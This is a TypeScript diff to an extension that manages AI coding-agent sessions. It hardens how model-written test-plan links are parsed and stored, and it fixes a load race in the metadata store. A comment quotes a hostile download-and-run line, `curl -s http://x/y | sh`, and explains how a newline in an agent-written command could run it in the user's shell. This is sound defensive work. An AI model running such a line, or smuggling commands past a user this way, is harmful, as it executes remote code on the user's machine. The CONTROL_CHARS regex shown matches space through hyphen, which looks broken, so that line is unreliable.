@@ -132,6 +132,14 @@ export function normaliseTestPlan(raw: unknown): TestPlan | undefined {
         const o = l as Record<string, unknown>
         const target = typeof o.target === 'string' ? o.target.trim() : ''
         if (!target) return []
+        // Dropped, not sanitised. A link whose target had to be rewritten
+        // before it was safe cannot be shown honestly — the button's label is
+        // model-written too, so the user would be told one thing and given
+        // another. `trim()` only ever stripped the OUTSIDE, which is why a
+        // newline in the middle survived to reach the user's shell. Filtered
+        // here, on the parse, so a plan stored by an older build is filtered on
+        // the way back out as well.
+        if (!targetIsClean(target)) return []
         const kind: TestLinkKind =
           o.kind === 'file' || o.kind === 'command' || o.kind === 'url' ? o.kind : guessLinkKind(target)
         const label = typeof o.label === 'string' && o.label.trim() ? o.label.trim() : target
@@ -145,6 +153,40 @@ export function normaliseTestPlan(raw: unknown): TestPlan | undefined {
     links,
     at: typeof r.at === 'number' ? r.at : Date.now(),
   }
+}
+
+/**
+ * Control characters, which a test-plan target may never contain.
+ *
+ * `target` is MODEL-WRITTEN, and a `command` link is handed to
+ * `Terminal.sendText(target, false)`. The `false` means "do not append a
+ * newline" — but a newline INSIDE the string is still a newline to the shell,
+ * so `"curl -s http://x/y | sh\n# npm test"` executes the curl the instant the
+ * button is pressed and leaves the comment typed at the prompt. The whole
+ * safety argument for that branch was a comment above it saying the user "gets
+ * to read it before pressing Enter", and that was false for any target with a
+ * `\n` in it.
+ *
+ * It was also the only one of the three link kinds whose guard was prose:
+ * `url` is refused unless the scheme is http(s), and `file` goes through
+ * `realResolveInWorktree` and must stay inside the worktree. And it crossed the
+ * permission boundary in the wrong direction — the terminal is the USER's
+ * shell, unsandboxed and outside the worktree, while `set_phase` is
+ * auto-allowed on the stated grounds that the board tools "only write to our
+ * own sidecar". A sidecar write that becomes a shell execution on one click is
+ * that justification failing.
+ *
+ * `\r` submits too (the pty maps CR to NL), and an escape sequence can rewrite
+ * what the terminal shows before the user reads it — so this is every C0
+ * control and DEL, not just the two newlines.
+ */
+const CONTROL_CHARS = /[ -]/
+
+/** Is this target safe to store and to show? Defined ONCE, and used by both the
+ *  parse that stores a test plan and the click that acts on one — a second copy
+ *  of this predicate is the shape of bug this file already has a rule about. */
+export function targetIsClean(target: string): boolean {
+  return !CONTROL_CHARS.test(target)
 }
 
 /** Best guess when an agent omits `kind`, so a usable link is never dropped. */
@@ -198,9 +240,33 @@ export interface SessionMeta {
    * a list of them is a bookkeeping problem. `rename()` repoints it.
    */
   parent?: string
+  /**
+   * How many subtasks this card was split into, as APPROVED — not as started.
+   *
+   * The one thing a parent stores about its children, and deliberately a COUNT
+   * rather than a list of keys, for the same reason `children[]` was rejected:
+   * a card's key is its run id until Claude Code assigns a session id, so a key
+   * list on the parent stops matching seconds into the first turn. A count
+   * cannot go stale under `rename()`.
+   *
+   * It exists because `childrenOf()` cannot answer "how many are there". A
+   * subtask held behind `maxConcurrentAgents` lives in the manager's in-memory
+   * queue with no card, no worktree and no sidecar entry — and `MAX_SUBTASKS`
+   * is 4 while the concurrency default is 3, so the last piece of a four-way
+   * split is ALWAYS queued. The roll-up therefore saw 2 children of a 4-way
+   * split, found every one of them settled, and told the user "All 2 subtasks
+   * are ready for you to test" over two agents that had never run.
+   *
+   * Never cleared, so it needs no sentinel — unlike `worktree` (`''`) and
+   * `running` (`0`), which `stripUndefined()` would otherwise strand.
+   */
+  fanout?: number
   /** How the user tests this session's work. Written by the agent when it moves
-   *  into a review column; rendered on the card as clickable actions. */
-  testPlan?: TestPlan
+   *  into a review column; rendered on the card as clickable actions.
+   *
+   *  `null` in a PATCH clears it — see `CLEAR_TEST_PLAN`. It is never `null` in
+   *  a stored entry; `normalise()` turns the sentinel into an absence. */
+  testPlan?: TestPlan | null
   /**
    * The context window the last run of this session actually got.
    *
@@ -243,9 +309,57 @@ export function emptyMeta(phase: string): SessionMeta {
  * A complete session cannot still be awaiting input. Normalising at every write
  * boundary stops the board, the card badge and the transcript disagreeing.
  */
+/**
+ * One sidecar entry, parsed rather than cast.
+ *
+ * The ONE place that knows how to read a stored entry — used by `all()` for our
+ * own file and by `mergePreviousInstalls()` for a previous install's. It used
+ * to be written out in `all()` and spread raw in the recovery path, which is
+ * the two-parsers-one-shape version of the rule this project already has a
+ * postmortem for.
+ *
+ * Returns undefined for anything that is not an object, so a corrupt entry is
+ * skipped rather than becoming a card in the default column.
+ */
+export function parseMeta(v: unknown): SessionMeta | undefined {
+  if (!v || typeof v !== 'object') return undefined
+  const m = v as Partial<SessionMeta>
+  const testPlan = normaliseTestPlan(m.testPlan)
+  return normalise({
+    phase: typeof m.phase === 'string' ? m.phase : 'planning',
+    tags: Array.isArray(m.tags) ? m.tags.filter((t): t is string => typeof t === 'string') : [],
+    archived: m.archived === true,
+    pinned: m.pinned === true,
+    ...(typeof m.worktree === 'string' ? { worktree: m.worktree } : {}),
+    ...(typeof m.branch === 'string' ? { branch: m.branch } : {}),
+    ...(typeof m.base === 'string' ? { base: m.base } : {}),
+    ...(typeof m.parent === 'string' ? { parent: m.parent } : {}),
+    ...(typeof m.fanout === 'number' && m.fanout > 0 ? { fanout: Math.floor(m.fanout) } : {}),
+    ...(typeof m.running === 'number' && m.running > 0 ? { running: m.running } : {}),
+    ...(typeof m.contextWindow === 'number' && m.contextWindow > 0 ? { contextWindow: m.contextWindow } : {}),
+    // Parsed, not cast. This file outlives the extension VERSION that wrote it,
+    // so an id from a build that served a runtime this one does not is another
+    // program's output — and it is read on the render path.
+    ...(parseRuntimeId(m.runtime) ? { runtime: parseRuntimeId(m.runtime)! } : {}),
+    ...(testPlan ? { testPlan } : {}),
+    ...(typeof m.model === 'string' ? { model: m.model } : {}),
+    // Closed unions, so a value from an older build cannot reach the picker.
+    ...(EFFORT_LEVELS.some((e) => e.key === m.effort) ? { effort: m.effort as EffortLevel } : {}),
+    ...(m.thinking === 'enabled' || m.thinking === 'disabled' ? { thinking: m.thinking } : {}),
+    activity: Array.isArray(m.activity)
+      ? (m.activity.filter((a) => !!a && typeof a === 'object') as ActivityEntry[])
+      : [],
+  })
+}
+
 export function normalise(m: SessionMeta): SessionMeta {
   const tags = [...new Set(m.tags.filter((t) => typeof t === 'string' && t.trim()))]
-  return { ...m, tags, activity: m.activity.slice(-MAX_ACTIVITY) }
+  const out = { ...m, tags, activity: m.activity.slice(-MAX_ACTIVITY) }
+  // The clear sentinel never survives into a stored entry: it is an
+  // instruction, not a value. `null` reaches here because `stripUndefined`
+  // deliberately lets it through — that is what makes it able to clear.
+  if (out.testPlan === CLEAR_TEST_PLAN) delete out.testPlan
+  return out
 }
 
 export class MetaStore {
@@ -253,6 +367,25 @@ export class MetaStore {
   private readonly recovered: string
   private readonly log: ((message: string) => void) | undefined
   private cache: Record<string, SessionMeta> | undefined
+  /**
+   * The load in flight, so two cold callers get the SAME map.
+   *
+   * `all()` guarded on `this.cache`, which is assigned only after a `readFile`
+   * and a `JSON.parse`. Two callers arriving in that window each built their
+   * own object and the second assignment replaced the first — so `update()`,
+   * `rename()` and `remove()`, which mutate the map `all()` handed them and
+   * then serialise `this.cache`, could write a map that did not contain the
+   * mutation. `update()` still resolved with the new value, so the caller was
+   * told the write had succeeded and the very next `get()` returned the stale
+   * one. That concurrency is reachable: `list()` runs `getAll()` inside a
+   * `Promise.all`, `rollUpToParent` fans `card()` across every sibling, and
+   * `launch()` calls `get()` and `patch()` while the first repaint is in
+   * flight.
+   *
+   * `SessionStore.infos()` and `foreign()` already cache the PROMISE for
+   * exactly this reason; this is the same fix one layer down.
+   */
+  private loading: Promise<Record<string, SessionMeta>> | undefined
   private writing: Promise<void> = Promise.resolve()
   private writeSeq = 0
 
@@ -324,6 +457,12 @@ export class MetaStore {
 
   private async all(): Promise<Record<string, SessionMeta>> {
     if (this.cache) return this.cache
+    if (this.loading) return this.loading
+    this.loading = this.load().finally(() => { this.loading = undefined })
+    return this.loading
+  }
+
+  private async load(): Promise<Record<string, SessionMeta>> {
     let raw = ''
     try { raw = await fs.readFile(this.file, 'utf8') } catch { /* first run, or renamed */ }
     let parsed: unknown
@@ -331,29 +470,8 @@ export class MetaStore {
     const out: Record<string, SessionMeta> = {}
     if (parsed && typeof parsed === 'object') {
       for (const [id, v] of Object.entries(parsed as Record<string, unknown>)) {
-        const m = v as Partial<SessionMeta>
-        const testPlan = normaliseTestPlan(m.testPlan)
-        out[id] = normalise({
-          phase: typeof m.phase === 'string' ? m.phase : 'planning',
-          tags: Array.isArray(m.tags) ? m.tags.filter((t): t is string => typeof t === 'string') : [],
-          archived: m.archived === true,
-          pinned: m.pinned === true,
-          ...(typeof m.worktree === 'string' ? { worktree: m.worktree } : {}),
-          ...(typeof m.branch === 'string' ? { branch: m.branch } : {}),
-          ...(typeof m.base === 'string' ? { base: m.base } : {}),
-          ...(typeof m.parent === 'string' ? { parent: m.parent } : {}),
-          ...(typeof m.running === 'number' && m.running > 0 ? { running: m.running } : {}),
-          ...(typeof m.contextWindow === 'number' ? { contextWindow: m.contextWindow } : {}),
-          // Parsed, not cast. This file outlives the extension VERSION that
-          // wrote it, so an id from a build that served a runtime this one does
-          // not is another program's output — and it is read on the render path.
-          ...(parseRuntimeId(m.runtime) ? { runtime: parseRuntimeId(m.runtime)! } : {}),
-          ...(testPlan ? { testPlan } : {}),
-          ...(typeof m.model === 'string' ? { model: m.model } : {}),
-          ...(typeof m.effort === 'string' ? { effort: m.effort as EffortLevel } : {}),
-          ...(typeof m.thinking === 'string' ? { thinking: m.thinking as ThinkingMode } : {}),
-          activity: Array.isArray(m.activity) ? (m.activity as ActivityEntry[]) : [],
-        })
+        const m = parseMeta(v)
+        if (m) out[id] = m
       }
     }
     this.cache = out
@@ -392,14 +510,21 @@ export class MetaStore {
         if (!parsed || typeof parsed !== 'object') continue
         for (const [id, v] of Object.entries(parsed as Record<string, unknown>)) {
           if (out[id] || !v || typeof v !== 'object') continue
-          const m = v as Partial<SessionMeta>
-          if (typeof m.phase !== 'string') continue
-          out[id] = normalise({
-            ...emptyMeta(m.phase),
-            ...(v as SessionMeta),
-            tags: Array.isArray(m.tags) ? m.tags.filter((t): t is string => typeof t === 'string') : [],
-            activity: Array.isArray(m.activity) ? m.activity : [],
-          })
+          // The SAME parser `all()` uses. This spread the previous install's
+          // raw JSON with `...(v as SessionMeta)`, validating only `phase`,
+          // `tags` and `activity` — twelve lines below a comment explaining
+          // that parsing here is load-bearing because the file outlives the
+          // version that wrote it. And these entries are written straight back
+          // into OUR file and served to `store.list()`, whose consumers assume
+          // the parsed shape: `archived` is used as a boolean, `running` has
+          // `Date.now() -` done to it, `runtime` routes which transcript reader
+          // to open, and `testPlan` reached the webview without ever passing
+          // `normaliseTestPlan`. It was also the only path that could produce a
+          // `pinned` that is not a boolean — and `pinned` is the board's
+          // primary sort key.
+          const parsedEntry = parseMeta(v)
+          if (!parsedEntry) continue
+          out[id] = parsedEntry
           added++
         }
       }
@@ -410,7 +535,7 @@ export class MetaStore {
           `extension (${found.map((f) => path.basename(path.dirname(path.dirname(f.from)))).join(', ')}). ` +
           'Renaming the extension moves its storage, and the phases were left behind.',
         )
-        await this.flush()
+        await this.flush(out)
       }
       await fs.mkdir(path.dirname(this.recovered), { recursive: true })
       await fs.writeFile(this.recovered, JSON.stringify([...done], null, 2), 'utf8')
@@ -445,7 +570,8 @@ export class MetaStore {
 
     const next = normalise({ ...before, ...stripUndefined(patch), activity })
     all[id] = next
-    await this.flush()
+    // The map THIS call mutated, not whatever `this.cache` happens to hold.
+    await this.flush(all)
     return next
   }
 
@@ -470,7 +596,7 @@ export class MetaStore {
       if (m.parent === from) { all[k] = { ...m, parent: to }; repointed = true }
     }
     const src = all[from]
-    if (!src) { if (repointed) await this.flush(); return }
+    if (!src) { if (repointed) await this.flush(all); return }
     const dst = all[to]
     all[to] = normalise(
       dst
@@ -480,17 +606,19 @@ export class MetaStore {
         : src,
     )
     delete all[from]
-    await this.flush()
+    await this.flush(all)
   }
 
   async remove(id: string): Promise<void> {
     const all = await this.all()
     delete all[id]
-    await this.flush()
+    await this.flush(all)
   }
 
-  private async flush(): Promise<void> {
-    const snapshot = JSON.stringify(this.cache ?? {}, null, 2)
+  /** @param all the map to write. Passed in rather than read off `this.cache`,
+   *  so a caller can never serialise somebody else's snapshot — see `loading`. */
+  private async flush(all?: Record<string, SessionMeta>): Promise<void> {
+    const snapshot = JSON.stringify(all ?? this.cache ?? {}, null, 2)
     const seq = ++this.writeSeq
 
     // Serialise writes so two rapid updates cannot interleave — but chain on
@@ -528,6 +656,22 @@ export class MetaStore {
 function stripUndefined<T extends object>(o: T): Partial<T> {
   return Object.fromEntries(Object.entries(o).filter(([, v]) => v !== undefined)) as Partial<T>
 }
+
+/**
+ * The sentinel that CLEARS a test plan.
+ *
+ * `stripUndefined()` drops `undefined` from a patch, so `undefined` cannot
+ * clear anything — which is exactly why `worktree` uses `''` and `running` uses
+ * `0`. `testPlan` had the same need and no sentinel, so a plan recorded once
+ * outlived the work it described forever: `patch(id, { testPlan: undefined })`
+ * was a no-op, and `normaliseTestPlan` refuses to manufacture an empty plan, so
+ * an agent explicitly retracting one was silently ignored. The panel could say
+ * "here is how to test this" and could never say "that is out of date".
+ *
+ * `null` rather than a magic empty object, because it is the one value that is
+ * both expressible in JSON and impossible to confuse with a real plan.
+ */
+export const CLEAR_TEST_PLAN = null
 
 /**
  * An explicit per-session value wins, then the workspace default, then nothing —
